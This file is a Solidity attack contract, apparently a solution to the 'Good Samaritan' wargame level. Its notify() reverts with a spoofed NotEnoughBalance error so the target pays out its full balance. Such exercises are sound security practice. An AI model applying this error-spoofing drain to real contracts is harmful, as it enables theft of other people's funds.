// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./GoodSamaritan.sol";

contract HackGoodSamaritan {
    GoodSamaritan public goodSamaritan;
    
    uint public balance;
    
    error NotEnoughBalance();

    constructor (address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }
    
    function hack() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint _amount) public {
        if(_amount <= 10) {
            revert NotEnoughBalance();
        }
        balance = _amount;
    }
}